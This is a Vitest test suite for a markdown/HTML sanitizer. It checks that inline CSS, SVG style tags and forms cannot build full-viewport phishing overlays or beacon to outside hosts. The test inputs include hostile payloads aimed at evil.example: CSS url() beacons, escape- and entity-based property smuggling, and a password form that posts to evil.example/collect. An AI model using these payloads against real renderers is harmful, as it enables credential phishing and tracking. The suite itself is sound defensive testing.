import { describe, expect, it } from 'vitest';
import { renderMarkdown, renderMarkdownDocAsync, sanitizeDocHtml } from '../markdown';
import { renderMath } from '../math';

/**
 * Inline CSS is a scripting-free injection primitive: no `<script>`, no event
 * handler, nothing a "no XSS" review looks for. A note (or a fetched page an
 * agent saved into the kiln) that survives with `position:fixed;inset:0` paints
 * a full-viewport surface INSIDE the trusted chrome — a credential prompt that
 * looks like ours — and `background:url(https://…)` beacons on render.
 *
 * These assert the contract from both sides: the only inline CSS that survives
 * is the presentational subset our own renderers (shiki, KaTeX) emit — it
 * cannot fetch, cannot be positioned, cannot reach viewport scale and cannot
 * move vertically — AND that subset survives INTACT, because a filter that
 * eats KaTeX's box metrics renders wrong formulas.
 */

/** The first element matching `selector` in a rendered fragment. */
function query(html: string, selector: string): HTMLElement | null {
  return new DOMParser()
    .parseFromString(html, 'text/html')
    .querySelector<HTMLElement>(selector);
}

/** Every `style="…"` value in a fragment. */
function styleValues(html: string): string[] {
  return [...html.matchAll(/style="([^"]*)"/g)].map((m) => m[1]);
}

describe('inline CSS in rendered content', () => {
  it('never lets content position itself against the viewport', async () => {
    const html = await renderMarkdownDocAsync(
      '<div style="position:fixed;inset:0;z-index:99999">Sign in to continue</div>',
    );
    expect(html).toContain('Sign in to continue');
    expect(html).not.toMatch(/position/i);
    expect(html).not.toMatch(/inset/i);
    expect(html).not.toMatch(/z-index/i);
  });

  it('never lets content fetch a URL from CSS', async () => {
    const html = await renderMarkdownDocAsync(
      '<p style="background:url(https://evil.example/beacon?c=1)">hi</p>' +
        '<p style="background-image:url(https://evil.example/b2)">ho</p>' +
        '<p style="cursor:url(https://evil.example/b3),auto">hu</p>' +
        '<p style="list-style-image:url(https://evil.example/b4)">he</p>',
    );
    expect(html).not.toContain('evil.example');
    expect(html).not.toMatch(/url\s*\(/i);
  });

  it('drops a declaration whose property is not one our renderers emit', () => {
    const html = sanitizeDocHtml(
      '<span style="transform:scale(400);opacity:0.01;pointer-events:none;' +
        'display:block;overflow:hidden;content:attr(href)">x</span>',
    );
    expect(styleValues(html)).toEqual([]);
  });

  it('drops a property name hidden behind CSS escapes or comments', () => {
    const html = sanitizeDocHtml(
      '<span style="posi\\74 ion:fixed">a</span>' +
        '<span style="pos/*x*/ition:fixed">b</span>' +
        '<span style="POSITION:FIXED">c</span>' +
        '<span style="  position  :  fixed  ">d</span>',
    );
    expect(html).toContain('a');
    expect(html).toContain('d');
    expect(styleValues(html)).toEqual([]);
  });

  it('drops an allowed property whose value is not a plain length or colour', () => {
    // `color` is allowed; these values are not — parens, escapes and quotes are
    // how `url()`/`expression()`/`image-set()` re-enter.
    const html = sanitizeDocHtml(
      '<span style="color:rgb(1,2,3)">a</span>' +
        '<span style="background-color:image-set(&quot;https://evil.example/x&quot; 1x)">b</span>' +
        '<span style="color:\\75 rl(https://evil.example/x)">c</span>',
    );
    expect(html).not.toContain('evil.example');
    expect(styleValues(html)).toEqual([]);
  });

  it('drops a property smuggled past the declaration split or the HTML parser', () => {
    const html = sanitizeDocHtml(
      // An escaped `;` does not split a declaration, so this is ONE declaration
      // whose value carries the payload — the value check has to catch it.
      '<span style="color:#fff\\3b position:fixed">a</span>' +
        // The HTML parser decodes entities before the sanitizer ever sees the
        // attribute, so the property arrives spelled out.
        '<span style="&#112;osition:fixed">b</span>' +
        // Custom properties are inherited and read by `var()` in our own
        // stylesheet — a channel that never looks like a style override.
        '<span style="--shell-bg:url(https://evil.example/x)">c</span>',
    );
    expect(html).not.toContain('evil.example');
    expect(styleValues(html)).toEqual([]);
  });

  it('keeps the safe declarations of a mixed attribute and drops the rest', () => {
    const html = sanitizeDocHtml('<span style="color:#ff0000;position:fixed;top:0">x</span>');
    expect(styleValues(html)).toEqual(['color:#ff0000;top:0']);
  });

  it('applies to SVG and to raw fragments, not just block HTML', () => {
    const svg = sanitizeDocHtml('<svg><rect style="position:fixed;fill:url(https://evil.example/x)"/></svg>');
    expect(svg).not.toContain('evil.example');
    expect(svg).not.toMatch(/position/i);
  });

  it('never lets a document define CSS for the rest of the page', () => {
    // A bare <style> is already emptied by DOMPurify's FORBID_CONTENTS, but the
    // same element inside <svg> is not — and an SVG <style> in an HTML document
    // is NOT scoped to the SVG: its rules apply document-wide. That is strictly
    // more powerful than the style attribute this suite is about.
    const html = sanitizeDocHtml(
      '<style>body{position:fixed}</style>' +
        '<svg><style>body{position:fixed;background:url(https://evil.example/x)}</style></svg>' +
        '<svg><STYLE>body{position:fixed}</STYLE></svg>',
    );
    expect(html).not.toContain('evil.example');
    expect(html).not.toMatch(/position/i);
    expect(html).not.toMatch(/<style/i);
  });

  it('never renders a form, so an overlay has nowhere to post to', () => {
    // Inline CSS is only half a phishing overlay; the other half is a way off
    // the origin. DOMPurify permits <form> by default, and no renderer here
    // emits one. (The task-list <input> must survive — it is ours.)
    const html = sanitizeDocHtml(
      '<form action="https://evil.example/collect" method="post">' +
        '<input name="password" type="password"><button>Sign in</button></form>',
    );
    expect(html).not.toMatch(/<form/i);
    expect(html).not.toContain('evil.example');
    expect(renderMarkdown('- [x] done')).toContain('class="task-checkbox"');
  });

  it('never lets content size or shift itself against the viewport', () => {
    // Every property here is on the allowlist and every value is a plain
    // length — the unit is the whole attack. `100vw`/`100vh` is a
    // viewport-sized box and `-100vw` walks it across the page, no `position`
    // needed. Container-query units count too: with no containment ancestor
    // they resolve against the small viewport.
    const html = sanitizeDocHtml(
      '<span style="width:100vw;height:100vh">a</span>' +
        '<span style="margin-left:-100vw">b</span>' +
        '<span style="width:100dvw;height:100svh;min-width:50lvmin">c</span>' +
        '<span style="width:100cqw;height:100cqh">d</span>',
    );
    expect(styleValues(html)).toEqual([]);
  });

  it('never lets content set a vertical margin', () => {
    // The `margin` SHORTHAND was the only reachable way to set margin-top: a
    // negative one drags an element UP over the content above it, which is the
    // overlay this filter exists to stop and needs no `position` at all.
    // KaTeX only ever needs the horizontal sides, and those stay.
    const html = sanitizeDocHtml(
      '<span style="margin:-9999px">a</span>' +
        '<span style="margin:0 -0.02em">b</span>' +
        '<span style="margin-top:-9999px">c</span>' +
        '<span style="margin-bottom:-9999px">d</span>',
    );
    expect(styleValues(html)).toEqual([]);
    expect(
      styleValues(sanitizeDocHtml('<span style="margin-left:-0.1945em;margin-right:0.05em">x</span>')),
    ).toEqual(['margin-left:-0.1945em;margin-right:0.05em']);
  });

  it('keeps the presentational styles KaTeX and shiki depend on', () => {
    // KaTeX struts carry their box metrics inline — strip these and every
    // fraction, radical and integral misrenders. Regression guard on the filter.
    const math = renderMarkdown('$$\\frac{a}{b}$$');
    expect(math).toContain('class="katex"');
    expect(math).toMatch(/style="[^"]*height:/);
    expect(math).toMatch(/style="[^"]*vertical-align:/);
  });

  it('keeps the offset that lands a KaTeX accent over its base glyph', () => {
    // `.accent-body` is a ZERO-WIDTH box — katex.min.css has
    // `.accent-body:not(.accent-full){width:0}` and positions it `relative` by
    // class — so the inline `left` is the ONLY thing pulling the arrow back
    // over the `v`. Without it the accent paints to the RIGHT of its base:
    // a wrong formula, not a cosmetic nudge.
    const accent = query(renderMarkdown('$\\vec{v}$'), '.accent-body');
    const raw = query(renderMath('\\vec{v}', false), '.accent-body');
    expect(raw?.style.left).toMatch(/^-\d*\.?\d+em$/); // KaTeX really emits it
    expect(accent?.style.left).toBe(raw?.style.left);
    // The arrow itself is an inline <svg>; it has to survive the sanitize too,
    // or there is nothing for `left` to position.
    expect(accent?.querySelector('svg path')).not.toBeNull();
  });
});
